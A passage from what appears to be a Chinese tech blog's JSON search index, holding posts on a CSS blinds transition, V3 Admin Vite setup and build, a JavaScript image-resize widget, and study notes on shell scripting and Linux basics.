linear-gradient(calc(3.6deg * var(--seed)), red 50%, blue 50%); animation: seed 1s linear infinite; } 参考资料 使用“变量种子计数器”扩展CSS动画更多可能性 ","link":"https://zkrisj.github.io/post/shi-yong-bian-liang-chong-zi-ji-shu-qi-kuo-zhan-css-dong-hua/"},{"title":"CSS 百叶窗转场动画效果","content":"介绍 Chrome 等浏览器（不包括 Safari）有个特性，就是当我们使用 @keyframes 定义关键帧的时候，关键帧里面设置的属性也是会运行的，典型的案例就是 content 属性与内容变化。 不仅普通的 CSS 属性可以在 CSS 动画关键帧中运行，CSS 自定义属性（CSS 变量）也可以在 CSS 动画关键帧中运行。例如： @keyframes var { 33% { --someVar: 33%; } 66% { --someVar: 66%; } } 如果我们某一个 CSS 属性值是基于这个 --someVar 变量构成的，那岂不是就算这个属性值不支持 CSS 动画，我只要让每一个百分比值的间隙足够的小，不也能够实现一个平滑的动画效果？ 具体做法就是，把 CSS 动画关键帧从 0%-100% 分成 101 份，然后每一份从 0 开始依次计数，就像是个计数器一样，然后把这个计数器分配给一个特定的 CSS 变量。最终我们可以得到一个如下所示的 CSS 动画“变量种子计数器”。 @keyframes seed { 0%{--seed:0}1%{--seed:1}2%{--seed:2}...99%{--seed:99}100%{--seed:100} } 上面这段 @keyframes seed{} 相关 CSS 代码就是一个可以无限使用的“动画种子”，无论是那些原本支持 CSS 动画的属性，还是不支持 CSS 动画的属性，只要它的属性值是与数值相关的，都能够借助这个“动画种子”实现动画效果。 百叶窗转场效果 如果我们的线性渐变是水平方向的，则可以实现百叶窗效果。 CSS代码： zxx-slide { display: block; width: 250px; height: 186px; position: relative; } .zxx-slide-a { position: absolute; display: none; } .zxx-slide-a.in { z-index: 1; } .zxx-slide-img { display: block; width: 250px; height: 186px; } .zxx-slide-index-x { position: absolute; left: 0; right: 0; bottom: 10px; text-align: center; font-size: 0; z-index: 1; } .zxx-slide-index { display: inline-block; width: 20px; height: 20px; padding: 0; margin: 0; box-sizing: border-box; border: 5px solid transparent; background-color: rgba(0,0,0,.6); background-clip: content-box; border-radius: 50%; transition: background-color .3s; cursor: pointer; } .zxx-slide-index.active { background-color: rgba(255,0,0,.9); } @keyframes seed { 0%{--seed:0}1%{--seed:1}2%{--seed:2}3%{--seed:3}4%{--seed:4}5%{--seed:5}6%{--seed:6}7%{--seed:7}8%{--seed:8}9%{--seed:9}10%{--seed:10}11%{--seed:11}12%{--seed:12}13%{--seed:13}14%{--seed:14}15%{--seed:15}16%{--seed:16}17%{--seed:17}18%{--seed:18}19%{--seed:19}20%{--seed:20}21%{--seed:21}22%{--seed:22}23%{--seed:23}24%{--seed:24}25%{--seed:25}26%{--seed:26}27%{--seed:27}28%{--seed:28}29%{--seed:29}30%{--seed:30}31%{--seed:31}32%{--seed:32}33%{--seed:33}34%{--seed:34}35%{--seed:35}36%{--seed:36}37%{--seed:37}38%{--seed:38}39%{--seed:39}40%{--seed:40}41%{--seed:41}42%{--seed:42}43%{--seed:43}44%{--seed:44}45%{--seed:45}46%{--seed:46}47%{--seed:47}48%{--seed:48}49%{--seed:49}50%{--seed:50}51%{--seed:51}52%{--seed:52}53%{--seed:53}54%{--seed:54}55%{--seed:55}56%{--seed:56}57%{--seed:57}58%{--seed:58}59%{--seed:59}60%{--seed:60}61%{--seed:61}62%{--seed:62}63%{--seed:63}64%{--seed:64}65%{--seed:65}66%{--seed:66}67%{--seed:67}68%{--seed:68}69%{--seed:69}70%{--seed:70}71%{--seed:71}72%{--seed:72}73%{--seed:73}74%{--seed:74}75%{--seed:75}76%{--seed:76}77%{--seed:77}78%{--seed:78}79%{--seed:79}80%{--seed:80}81%{--seed:81}82%{--seed:82}83%{--seed:83}84%{--seed:84}85%{--seed:85}86%{--seed:86}87%{--seed:87}88%{--seed:88}89%{--seed:89}90%{--seed:90}91%{--seed:91}92%{--seed:92}93%{--seed:93}94%{--seed:94}95%{--seed:95}96%{--seed:96}97%{--seed:97}98%{--seed:98}99%{--seed:99}100%{--seed:100} } zxx-slide .in { -webkit-mask: linear-gradient(to right, #000 calc(1% * var(--seed)), transparent calc(1% * var(--seed))); -webkit-mask-size: 20px; mask: linear-gradient(to right, #000 calc(1% * var(--seed)), transparent calc(1% * var(--seed))); mask-size: 20px; animation: seed .6s; } HTML代码： &lt;zxx-slide&gt; &lt;div class=&quot;zxx-slide-x&quot;&gt; &lt;a href class=&quot;zxx-slide-a&quot; style=&quot;display: block;&quot;&gt;&lt;img class=&quot;zxx-slide-img&quot; src=&quot;./ps1.jpg&quot;&gt;&lt;/a&gt; &lt;a href class=&quot;zxx-slide-a&quot;&gt;&lt;img class=&quot;zxx-slide-img&quot; src=&quot;./ps2.jpg&quot;&gt;&lt;/a&gt; &lt;a href class=&quot;zxx-slide-a&quot;&gt;&lt;img class=&quot;zxx-slide-img&quot; src=&quot;./ps3.jpg&quot;&gt;&lt;/a&gt; &lt;a href class=&quot;zxx-slide-a&quot;&gt;&lt;img class=&quot;zxx-slide-img&quot; src=&quot;./ps4.jpg&quot;&gt;&lt;/a&gt; &lt;/div&gt; &lt;div class=&quot;zxx-slide-index-x&quot;&gt; &lt;button class=&quot;zxx-slide-index active&quot;&gt;&lt;/button&gt; &lt;button class=&quot;zxx-slide-index&quot;&gt;&lt;/button&gt; &lt;button class=&quot;zxx-slide-index&quot;&gt;&lt;/button&gt; &lt;button class=&quot;zxx-slide-index&quot;&gt;&lt;/button&gt; &lt;/div&gt; &lt;/zxx-slide&gt; JS代码： var eleZxxSlides = document.querySelectorAll('zxx-slide'); [].slice.call(eleZxxSlides).forEach(function(container) { var timerSlide = null; var indexSlide = 0; container.addEventListener('mouseover', function() { clearTimeout(timerSlide); }); container.addEventListener('mouseout', function() { clearTimeout(timerSlide); funSlide(); }); // 对应的元素 var eleSlides = [].slice.call(container.querySelectorAll('a')); var eleButtons = [].slice.call(container.querySelectorAll('button')); // hover显示对应幻灯 eleButtons.forEach(function(button, index) { ['mouseover', 'click'].forEach(function(eventType) { button.addEventListener(eventType, function() { clearTimeout(timerSlide); indexSlide = index; funSlide(); }); }); }); eleSlides.forEach(function(slide, index) { slide.addEventListener('animationend', function() { eleSlides.forEach(function(slide2) { if (slide2.classList.contains('in') == false) { slide2.style.display = ''; } }); }); }); // 切换方法 var funSlide = function() { eleSlides.forEach(function(slide, index) { if (indexSlide == index) { slide.classList.add('in'); slide.style.display = 'block'; } else if (slide.classList.contains('in')) { slide.classList.remove('in'); } }); eleButtons.forEach(function(button, index) { button.classList.remove('active'); if (indexSlide == index) { button.classList.add('active'); } }); timerSlide = setTimeout(function() { indexSlide++; if (indexSlide == eleSlides.length) { indexSlide = 0; } funSlide(); }, 4000); } indexSlide++; setTimeout(funSlide, 1000); }); 码上掘金 参考资料 你用的那些CSS转场动画可以换一换了 ","link":"https://zkrisj.github.io/post/css-bai-xie-chuang-zhuan-chang-dong-hua-xiao-guo/"},{"title":"V3 Admin Vite 接口和打包配置","content":"介绍 V3 Admin Vite 是一个免费开源的中后台管理系统基础解决方案，基于 Vue3、TypeScript、Element Plus、Pinia 和 Vite 等主流技术。另外还有： Vue-Cli 5.x 版: v3-admin Electron 桌面版: v3-electron-vite 接口 所有的请求最终都是通过 Axios 来发送的，我们可以找到封装 Axios 的文件，看见后端接口的 baseURL 是 import.meta.env.VITE_BASE_API。 可以在 .env 配置文件（.env.development 代表开发环境配置， .env.staging 代表预发布环境配置，.env.production 代表正式环境配置）中找到定义 VITE_BASE_API 的地方： 这里采用了相对路径 /api/v1，例如开发环境运行在 http://localhost:3333 路径下，也就意味着前端调用后端接口时，调用的具体的 baseURL 将会是 http://localhost:3333/api/v1。 登录接口的 url 是 users/login，也就意味着，在调用该接口时，最终请求的路径将会是：baseURL + 该接口的 url = http://localhost:3333/api/v1/users/login。 由于真实后端接口是部署在线上的，假如线上部署的登录接口完整路径是： https://mock.mengxuegu.com/mock/6321865fb4c53348ed2bc212/api/ul/users/login， 那么我们可以通过反向代理来将 http://localhost:3333 代理到 https://mock.mengxuegu.com/mock/63218b5fb4c53348ed2bc212。反向代理配置如图： 这只是开发环境配置好了反向代理，以后部署前端到线上环境的时候，需要采用 Nginx 或其他工具来实现线上环境的反向代理。 打包 模板项目本身是需要部署到这个域名下：https://un-pany.github.io/v3-admin-vite/，所以我们需要在 .env.staging 和 .env.production 中设置打包路径： ## 打包路径（就是网站前缀，例如部署到 https://un-pany.github.io/v3-admin-vite/ 域名下，就需要填写 /v3-admin-vite/） VITE_PUBLIC_PATH = '/v3-admin-vite/' 假如是要部署到 https://xxx.com/yyy/ 下，那么就需要填写 VITE_PUBLIC_PATH = '/yyy/'。假如是要部署到 https://xxx.com/ 下，那么就需要填写 VITE_PUBLIC_PATH = '/'。 和打包相关的命令是 build，我们以打包正式环境为例，就要运行下面的命令： pnpm build:prod 这个命令就会自动去读取我们前文配置好的 .env.production 文件，而 pnpm build:stage 会自动读取 .env.staging 文件，代表的是预发布环境。 打包完成后，就可以在根目录下，看见一个名为 dist 的静态资源文件夹，这整个文件夹就是需要丢到前端服务器上去的东西。 然后可以通过运行 pnpm preview:stage 或 pnpm preview:prod 来预览 dist 中的静态资源文件。 ","link":"https://zkrisj.github.io/post/v3-admin-vite-jie-kou-he-da-bao-pei-zhi/"},{"title":"V3 Admin Vite 介绍和基本使用","content":"介绍 V3 Admin Vite 是一个免费开源的中后台管理系统基础解决方案，基于 Vue3、TypeScript、Element Plus、Pinia 和 Vite 等主流技术。另外还有： Vue-Cli 5.x 版: v3-admin Electron 桌面版: v3-electron-vite 功能 用户管理：登录、登出演示 权限管理：内置页面权限（动态路由）、指令权限、权限函数、路由守卫 多环境：开发环境（development）、预发布环境（staging）、正式环境（production） 多主题：内置普通、黑暗、深蓝三种主题模式 错误页面: 403、404 Dashboard：根据不同用户显示不同的 Dashboard 页面 其他内置功能：SVG、动态侧边栏、动态面包屑、标签页快捷导航、Screenfull 全屏、自适应收缩侧边栏 特性 Vue3：采用 Vue3 + script setup 最新的 Vue3 组合式 API Element Plus：Element UI 的 Vue3 版本 Pinia: 传说中的 Vuex5 Vite：真的很快 Vue Router：路由路由 TypeScript：JavaScript 语言的超集 PNPM：更快速的，节省磁盘空间的包管理工具 Scss：和 Element Plus 保持一致 CSS 变量：主要控制项目的布局和颜色 ESlint：代码校验 Prettier：代码格式化 Axios：发送网络请求（已封装好） UnoCSS：具有高性能且极具灵活性的即时原子化 CSS 引擎 注释：各个配置项都写有尽可能详细的注释 兼容移动端: 布局兼容移动端页面分辨率 本地安装 克隆仓库： git clone https://github.com/un-pany/v3-admin-vite.git // 或克隆国内镜像仓库 git clone https://gitee.com/un-pany/v3-admin-vite.git V3 Admin Vite 是推荐使用 pnpm 命令来安装第三方依赖，而不是直接使用 npm 命令，所以需要安装 pnpm。 npm install -g pnpm 安装依赖： pnpm i 如果安装太慢，可以选择将官方依赖源切换为淘宝依赖源： pnpm config set registry https://registry.npmmirror.com 运行开发版预览： pnpm dev 如下图所示代表运行成功： 打开项目地址后，界面如下： 构建和预览：预发布环境、正式环境。 # 构建预发布环境 pnpm build:stage # 预览预发布环境 pnpm preview:stage # 构建正式环境 pnpm build:prod # 预览正式环境 pnpm preview:prod 代码格式化和单元测试： # 代码格式化 pnpm lint # 单元测试 pnpm test Git 提交规范参考 feat 增加新的业务功能 fix 修复业务问题/BUG perf 优化性能 style 更改代码风格, 不影响运行结果 refactor 重构代码 revert 撤销更改 test 测试相关, 不涉及业务代码的更改 docs 文档和注释相关 chore 更新依赖/修改脚手架配置等琐事 workflow 工作流改进 ci 持续集成相关 types 类型定义文件更改 wip 开发中 目录结构 # v3-admin-vite ├─ .husky # 用户提交代码时格式化代码 ├─ .vscode # 本项目推荐的 vscode 配置和拓展 ├─ public │ ├─ favicon.ico │ ├─ app-loading.css # 首屏加载 loading ├─ src │ ├─ api # api 接口 │ ├─ assets # 静态资源 │ ├─ components # 全局组件 │ ├─ config # 全局配置 │ ├─ constant # 常量/枚举 │ ├─ directives # 全局指令 │ ├─ hooks # 全局 hook │ ├─ icons # svg icon │ ├─ layout # 布局 │ ├─ plugins # 全局插件 │ ├─ router # 路由 │ ├─ store # pinia store │ ├─ styles # 全局样式 │ ├─ utils # 全局公共方法 │ └─ views # 所有页面 │ ├─ App.vue # 入口页面 │ └─ main.ts # 入口文件 ├─ tests # 单元测试 ├─ types # ts 声明 ├─ .env.development # 开发环境 ├─ .env.production # 正式环境 ├─ .env.staging # 预发布环境 ├─ .eslintrc.js # eslint 配置 ├─ .prettier.config.js # prettier 配置 ├─ tsconfig.json # ts 编译配置 ├─ unocss.config.ts # unocss 配置 └─ vite.config.ts # vite 配置 ","link":"https://zkrisj.github.io/post/v3-admin-vite-jie-shao-he-ji-ben-shi-yong/"},{"title":"拖拽图片缩放效果","content":"介绍 实现下图所示的图片拖拽缩放效果： 通常实现方式都是 &lt;img&gt; 元素外面包裹个 DIV，然后定位一些方框框，然后再去拉伸。如果是非编辑器产品，这么实现并没有多大的问题。 但是如果是需要实时编辑的产品，IMG 外面还有其他标签，势必会影响很多编辑操作。 当然，还有方法就是 JS 定位，拖拽层覆盖在图像上，从技术成本上讲，也是一个不错的实现，但如果页面发生了滚动，或者拖拽很快，拖拽的小方块就有可能跟不上（具体要看你的实现）。 CSS 四个角四个圆圈圈，比较简洁，凡是这种在元素边框（不包括边角）包含规则图形（没有图形也是一种规律）的效果，一定是使用 CSS border-image 属性。 下图是使用处理后的素材配合 border-image 属性实现的效果： 可能图有些小，看不到细节，把边角放大 N 倍看下： border-image 生成的图形藏在了图像内容的后面。在 Web 中，content 内容的层级是最高的，outline 轮廓、border 边框、background 背景色等都是比图文内容的层级低的。因此，border-image 的图形在 IMG 元素内容的后面，导致边角的拖拽圈圈显示不全。 将拖拽图形全部改造为在图像元素的外部，这样就不会有被内容覆盖的问题了： 相关 CSS代码如下： img.resizable, img[resizable] { border: 3px solid transparent; border-image: url(./作者zhangxinxu.svg) 12 / 12px / 0; } JS 代码 function onlyImageResize(options) { var doc = document; var win = window; // 参数处理 var defaults = { selector: '.resizable, [resizable]', maxWidth: true, whenDisabled: function() { return win.imgResizable === false || doc.imgResizable === false; }, // 拖拽完成 onFinish: function() {} }; options = options || {}; var params = {}; for (var key in defaults) { params[key] = options[key] || defaults[key]; } // 存放临时数据的地方 var store = {}; // 匹配目标元素的选择器 var strSelector = params.selector; var strSelectorImg = strSelector.split(',').map(function(selector) { return 'img' + selector.trim(); }).join(); var strSelectorActive = strSelector.split(',').map(function(selector) { return selector.trim() + '.active'; }).join(); // 载入必要的 CSS 样式 var eleStyle = document.createElement('style'); var strSvg = &quot;data:image/svg+xml,%3Csvg width='30' height='30' viewBox='0 0 30 30' fill='none' xmlns='http://www.w3.org/2000/svg'%3E%3Cpath stroke='%23914AFF' d='M2.5 2.5h25v25h-25z'/%3E%3Cpath d='M0 0v12h2V2h10V0H0zM0 30V18h2v10h10v2H0zM30 0H18v2h10v10h2V0zM30 30H18v-2h10V18h2v12z' fill='%23914AFF'/%3E%3C/svg%3E&quot;; eleStyle.innerHTML = strSelectorImg + '{display:inline-block;vertical-align: bottom;font-size:12px;border: 3px solid transparent;margin:-1px;position: relative;-webkit-user-select: none; user-select: none; }' + strSelectorActive + '{border-image: url(&quot;' + strSvg + '&quot;) 12 / 12px / 0; cursor: default; z-index: 1;}'; document.head.appendChild(eleStyle); // 先点击图片，进入可拉伸状态 doc.addEventListener('click', function(event) { var eleTarget = event.target; if (!eleTarget || !eleTarget.matches) { return; } var eleActive = document.querySelector(strSelectorActive); if (eleActive &amp;&amp; eleActive != eleTarget) { eleActive.classList.remove('active'); } if (params.whenDisabled()) { return; } if (eleTarget.matches(strSelector)) { eleTarget.classList.add('active'); } }); // 设置拉伸触发的标志量 doc.addEventListener('mousedown', function(event) { var eleTarget = event.target; if (eleTarget.matches &amp;&amp; eleTarget.matches(strSelectorActive) &amp;&amp; eleTarget.style.cursor) { event.preventDefault(); store.reszing = true; store.image = eleTarget; store.clientX = event.clientX; store.clientY = event.clientY; // 此时图片的尺寸 store.imageWidth = eleTarget.width || eleTarget.clientWidth; store.imageHeight = eleTarget.height || eleTarget.clientHeight; // 此时图片的拉伸方位 store.position = eleTarget.position; // 最大宽度 if (typeof params.maxWidth == 'number') { store.maxWidth = params.maxWidth; } else if (params.maxWidth) { // 使用第一个非内联水平的祖先元素的尺寸作为最大尺寸 var eleParent = (function(element) { var step = function(ele) { var display = getComputedStyle(ele).style; if (/inline/.test(display)) { return step(ele.parentElement); } return ele; } return step(element); })(eleTarget.parentElement); // 设置最大尺寸 if (eleParent) { store.maxWidth = eleParent.clientWidth - 4; } } } }); // 设置手形，或者拖拽，视标志量决定 doc.addEventListener('mousemove', function(event) { var eleTarget = event.target; if (store.reszing) { event.preventDefault(); // 移动距离 var distanceX = event.clientX - store.clientX; var distanceY = event.clientY - store.clientY; // 变化的尺寸 var width = 0; var height = 0; // 方位计算是加还是减 var scale = 1; // 不同方位有着不同的判断逻辑 var position = store.position; // 左下角 if ((position == 'bottom left' || position == 'top right') &amp;&amp; distanceX * distanceY &lt; 0) { // 左下方是变大，右上是变小 // distanceX- distanceY+ 变大，distanceX+ distanceY-是变小 // 右上角 // 左下方是变小，右上是变大，正好和 'bottom left' 相反 if (position == 'top right') { scale = -1; } width = store.imageWidth - distanceX * scale; height = store.imageHeight + distanceY * scale; } else if ((position == 'top left' || position == 'bottom right') &amp;&amp; distanceX * distanceY &gt; 0) { // 左上角 // distanceX+, distanceY+是缩小 // distanceX-, distanceY-是放大 // 如果是右下角，则相反 if (position == 'bottom right') { scale = -1; } width = store.imageWidth - distanceX * scale; height = store.imageHeight - distanceY * scale; } if (!width &amp;&amp; !height) { return; } // 目标尺寸 var imageWidth = 0; var imageHeight = 0; // 图像的原始比例 var ratio = store.imageWidth / store.imageHeight; // 选择移动距离大的方向 if (Math.abs(distanceX) &gt; Math.abs(distanceY)) { // 宽度变化为主 imageWidth = width; imageHeight = width / ratio; } else { // 高度变化为主 imageHeight = height; imageWidth = height * ratio; } // 最终设置图片的尺寸 store.image.width = Math.round(imageWidth); store.image.height = Math.round(imageHeight); } else if (eleTarget.matches &amp;&amp; eleTarget.matches(strSelectorActive)) { // 根据位置设置手形 var clientX = event.clientX; var clientY = event.clientY; var bounding = eleTarget.getBoundingClientRect(); // 边缘判断 if ((clientX - bounding.left &lt; 20 &amp;&amp; clientY - bounding.bottom &gt; -20) || (clientX - bounding.right &gt; -20 &amp;&amp; clientY - bounding.top &lt; 20)) { eleTarget.style.cursor = 'nesw-resize'; // 判断位置 if (clientX - bounding.left &lt; 20) { eleTarget.position = 'bottom left'; } else { eleTarget.position = 'top right'; } } else if ((clientX - bounding.left &lt; 20 &amp;&amp; clientY - bounding.top &lt; 20) || (clientX - bounding.right &gt; -20 &amp;&amp; clientY - bounding.bottom &gt; - 20)) { eleTarget.style.cursor = 'nwse-resize'; // 判断位置 if (clientX - bounding.left &lt; 20) { eleTarget.position = 'top left'; } else { eleTarget.position = 'bottom right'; } } else { eleTarget.style.cursor = ''; eleTarget.position = ''; } } }); // 拖拽结束 doc.addEventListener('mouseup', function(event) { // 图片尺寸超出100%限制 if (store.image &amp;&amp; store.maxWidth &amp;&amp; store.image.width &gt; store.maxWidth) { // 目标尺寸 var imageWidth = store.maxWidth; var imageHeight = imageWidth / (store.imageWidth / store.imageHeight); // 最终设置图片的尺寸 store.image.width = Math.round(imageWidth); store.image.height = Math.round(imageHeight); } if (store.reszing) { store.reszing = false; params.onFinish(); } }); }; 使用 在 HTML 页面中直接引入上面 JS 代码就可以使用了： &lt;script&gt; onlyImageResize({ // 参数在这里 }); &lt;/script&gt; 此时，页面中所有设置了类名 .resizable，或者设置了 HTML 属性 resizable 的元素都可以四面拉伸了。 options 为可选参数，包括： selector 字符串值。默认值是 '.resizable, [resizable]'，表示识别为可拉伸图片的选择器。 maxWidth 数值或布尔值。默认是 true，表示有最大宽度限制，最大宽度值是第一个非内联祖先元素的宽度。支持设置为数值，指定最大宽度值。 whenDisabled 函数值，如果返回 true，表示禁用图像的拉伸，如果是 false，则拉伸执行。默认值是： function () { return window.imgResizable === false || document.imgResizable === false; } 表示，如果 window.imgResizable 或者 document.imgResizable 的值是 false，则禁用拉伸。 onFinish 函数值，默认是空函数，拖拽结束的时候触发。 码上掘金 参考资料 JS之我用单img元素实现了图像resize拉伸效果 体验地址：https://zhangxinxu.gitee.io/only-img-resize/ ","link":"https://zkrisj.github.io/post/tuo-zhuai-tu-pian-suo-fang-xiao-guo/"},{"title":"Shell 脚本和编程 ｜ 青训营笔记","content":"介绍 Shell 脚本是一种用Shell脚本语言编写的程序，它可以在 UNIX 或类 UNIX 操作系统上运行。Shell 脚本通常用于自动化任务、管理系统和编写小型应用程序。Shell 脚本可以完成许多任务，例如文件操作、进程管理、网络管理、系统配置等。 Shell 脚本语言基于命令行界面，它使用 Shell 解释器（例如 Bash）解释 Shell 脚本语言。 Shell 脚本语言的语法非常简单，可以包含各种命令和操作，例如条件语句、循环语句、函数、变量和输入/输出操作等，易于学习和使用。 学习 shell 的价值 Linux 服务器的基本操作和管理。 前端 node.is 服务的进程管理、问题排查、资源监控等运维操作。 使用 shell 编写 TCE、SCM、Docker 脚本，完成服务编译和部署。 概念 物理终端 =&gt; 软件终端 tty =&gt; 终端模拟器 =&gt; Shell 终端：获取用户输入，展示运算结果的硬件设备。 tty：teletypeWriter 的简称，和终端等价，早期指电报打印机，在 linux 中是输入输出环境。 终端模拟器：Mac Terminal、iTerm2 等，关联虚拟 tty 的输入输出软件。 Shell：command interpreter，处理来自终端模拟器的输入，解释执行之后输出结果给终端。 Bash：Shell 的一种具体实现。 流程 tty 或者说终端最开始指的是获取用户输入并输出的物理设备， 比如电传打字机。 在 linux 中是接收用户输入、输出结果的终端仿真软件， 比如我们用的 mac terminal、 iterm2 等， 更强输入辅助功能、画面绘制输出的模拟终端器； 而 tty 变成一个虚拟概念， 是 linux 的一个程序，每个终端模拟器关联一个虚拟 tty，和内核打交道。 我们可以在终端模拟器中输入 tty 查看关联到的虚拟 tty bash 是 shell 的一种具体实现, 可以理解成实例和类的关系。 发展 Ken Thompson（来自贝尔实验室）在 1971 年为 UNIX 开发了第一个 shell，称为 V6 shell Stephen Bourne 在贝尔实验室 为 V7 UNIX 所开发的 Bourne shell，即 sh 开源组织 GNU 为了取代 Bourne shell 开发的 Bourne-Again shell，即 Bash 除了替代 v6 shell，sh 还有几个优点，把控制流程，循环，变量引入了脚本，提供了一种更具功能性的语言 主流 Linux 系统使用的 shell，许多都以它为锚点。 bash是 sh 的超集，可以直接执行大部分 sh 脚本。 Bash 在兼容 Bourne shell 脚本编程的同时，集成了 Korn shell 和 C shell 的功能，包括命令历史，命令行编辑，目录堆栈（pushd 和 popd），一些实用环境变量，命令自动补全等。 语法 shell 不仅提供了与内核和设备交互的方法，还集成了一些今天软件开发中通用的设计模式（比如管道和过滤器），具备控制流程，循环，变量，命令查找的机制。 既是命令解释器，也是一门编程语言，作为命令解释器，它提供给用户接口，使用丰富的 GNU 工具集，第三方的或者内置的，比如 cd、pwd、exec、test、netstat 等。 变量 父子 Shell 的关系 自定义变量 declare [+/-] 选项 变量 环境变量 Bash Shel 在启动时总要配置其运行环境，例如初始化环境变量、设置命令提示符、指定系统命令路径等。 配置文件加载 通过系统用户登录默认运行的 shell 非登录交互式运行 shell 执行脚本运行非交互式 shell 如果取得 bash 需要完整的登录流程，我们称之为 login shell，比如 ssh 远程登录一台主机。不需要登录的 bash 我们称为 non-login bash，比如在原来的 bash 中执行 bash开启子进程、 执行一些外部命令。如果修改了配置文件，不会立即生效，需要我们重启终端或者执行 source 命令。 source ~/bashrc 运算符和引用 双引号：部分引用，使用这种引用时，$、`(反引号)、\\(转义符) 这 3 个还是会解析成特殊的意义 单引号：完全引用，只原样输出 反引号：执行命令 cmd &amp; 实现让命令在后台运行： 使用方法一的时候，当我们关闭终端，命令就会停止运行。加上nohup可以在关闭终端后不停止命令 管道与管道符 | 如果需要互通，比如第一个命令的返回传递给第二个命令，就需要用到管道了。管道的本质就是将多个程序进行了一个连接，和信号一样，也是进程通信的方式之一。 作用：将前一个命令的结果传递给后面的命令 语法: cmd1 | cmd2 要求:管道右侧的命令必须能接受标准输入才行，比如 grep 命令，ls、mv等不能直接使用，可以使用 xargs 预处理注意: 管道命令仅仅处理 stdout，对于 stderr 会予以忽略，可以使用 set-o pipefail 设置 shell 遇到管道错误退出 重定向 输出重定向符号： v：覆盖写入文件 &gt;&gt;：追加写入文件 2&gt;：错误输出写入文件 &amp;&gt;：正确和错误输出统一写入到文件中 输入重定向符号：&gt; 和 &gt;&gt;。 每个 shell 命令在执行时都会打开三个文件描述符， 文件描述符 0、1、2， 分别对应 stdin、stdout、stderr， 这三个文件描述符默认默认指向 终端输入、终端输出，那么当命令需要获取输入的时候，它会去读取 fd0， 当要输出的时候它会像 fd1、fd2写入， 改变这些描述符指向的行为叫做重定向 2&gt;&amp;1 必须写在 &gt; 之后 &lt;&lt; 比较特殊， 表示继续沿用当前的标准输入， 只是当识别到指定的标识符后停止， 将接收到的内容作为 stdin 实例: 用户在命令行输入内容，当输入 EOF 的时候停止， 所输入的内容写入 foo.txt 判断命令 shell 中提供了 test、[、[[ 三种判断符号，可用于： 整数测试 字符串测试 文件测试 语法: test condition [ condition ] [[ condition ]] 注意： 中括号前后要有空格符 [ 和 test 是命令只能使用自己支持的标志位，&lt;、&gt;、= 只能用来比较字符串 中括号内的变量，最好都是用引号括起来 [[ 更丰富，在整型比较中支持 &lt;、&gt;、=，在字符串比较中支持 =、~ 正则 根据程序是否正常执行（程序退出的状态）进行判断： exit：手动退出 shell 的命令 exit 10 返回 10 给 shell，返回值非 0 为不正常退出 $? 用于判读昂当前 shell 前一个进程是否正常退出（非 0 为不正常退出） 分支语句 语法1: if condition ;then 程序段 elif condition ; then 程序段 esle 程序段 fi 语法2: case $变量 in: &quot;第一个变量内容&quot;) 程序段 ;; &quot;第一个变量内容&quot;) 程序段 ;; *) 程序段 esac 循环 while循环 condition ; do 程序段; donewhile unti1循环（当条件成立的时候跳出循环，与 while循环相反） until condition ; do 程序段; done for循环 for var in [words...];do 程序段:done 函数 语法一： funcName() echo &quot;abc&quot;; 语法二： function funcName() { echo &quot;abc&quot;; } 函数也是命令 exit：手动退出 shell 、命令 exit 10 返回 10 给 shell，返回值非 0 为不正常退出 $? 用于判读昂当前 shell 前一个命令是否正常退出（非 0 为不正常退出） 为了函数内定义的变量不污染全局， 我们最好使用 local 去定义， 或者在函数退出之前使用 unset 去处理一下 注意： shell 自上而下执行，函数必须在使用前定义 函数获取变量和 shell script 类似，$0 代表函数名， 后续参数通过 $1、$2 ...获取 函数内 retun 仅仅表示函数执行状态，不代表函数执行结果 返回结果一般使用 echo、printf， 在外面使用 $0 获取 结果如果没有 return ，函数状态是上一条命令的执行状态，存储在 $? 中 模块化 模块化的原理是在当前 she11 内执行函数文件，方式：source [函数库的路径]。 常用命令 执行 shell 脚本文件一般以 .sh 结尾，也可以没有，这是一个约定; 第一行需要指定用什么命令解释器来执行。#! 是内核识别并选择合适的解释器之后，将文本文件再交给解释器执行。 启动方式： Shell 展开 大括号展开 (Brace Expansion) {...} 波浪号展开 (Tilde Expansion) ~ 参数展开 (Shell Parameter Expansion) 命令替换 (Command Substitution) 数学计算 (Arithmetic Expansion) $((..)) 文件名展开 (Filename Expansion) *?[..] 外壳文件名模式匹配 调试和前端集成 普通 log，使用 echo、printf 2. 使用 set 命令 3. vscode debug 插件 node node中通过 exec、spawn 调用 shell 命令 shell 脚本中调用 node 命令 借助 zx 等库进行 javascript、 shell script 的融合 借助 shell 完成系统操作，文件io、内存、磁盘系统状态查借助 nodejs 完成应用层能力， 网络io、计算等 借助 shell 完成系统操作，文件io、内存、磁盘系统状态查借助 nodejs 完成应用层能力， 网络io、计算等 exec 启动一个子 shell 进程执行传入的命令，并且将执行结果保存在缓冲区中， 并且缓冲区是有大小限制的，执行完毕通过回调函数返回， spawn 默认不使用 shell，而是直接启动子进程执行命令，且会直接返回一个 流对象，支持写入或者读取流数据，这个在大数据量交互的场景比较适合 总结 shell 的思想和语法和传统的编程语言不太一样，强调一条语句只干一件事，所以万物皆命令， 在执行过程中也是逐行、逐个连接符、逐个空格的解析出最小化的命令执行，执行完之后再解析下一句。了解 shell 的配置加载、执行方式、执行过程、命令解析过程、 必要的语法、常用命令，可以方便的写出自己的自动化脚本。 ","link":"https://zkrisj.github.io/post/shell-jiao-ben-he-bian-cheng-or-qing-xun-ying-bi-ji/"},{"title":"Linux 基础 ｜ 青训营笔记","content":"介绍 Linux 是由内核(kernel)、 shell(命令解释器)、文件系统和应用程序等组成的操作系统。它提供了丰富的工具和命令行界面，使用户能够轻松地管理和控制计算机系统。 Linux 具有稳定性高、安全性强、灵活性好、可靠性高等优点，同时还支持多任务处理和多用户操作，可以满足各种不同需求的用户。 Linux 操作系统被广泛应用于服务器、超级计算机、移动设备和嵌入式设备等领域，并且也逐渐普及到个人电脑的市场。 学习价值 Linux 是现代化应用程序交付的首选平台，无论是部署在裸机、虚拟化还是容器化环境。 公司内部服务（TCE、FaaS、SCM）统一使用 Debian Linux 系统。 熟悉 Linux 基础指令，熟练运维前端常用服务（Nginx、Node.js）。 加深对操作系统概念和实现的理解，夯实基础知识。 Logo 企鹅是南极洲的标志性动物，根据国际公约，南极洲为全人类共同所有，不属于当今世界上的任何国家。 Linux 选择企鹅图案作标志，其含意也是表明：开源的 Linux 为全人类共同所有，任何公司无权将其私有。 计算机组成 控制器 运算器 存储器单元 输入单元 输出单元 操作系统（Operating System，OS） 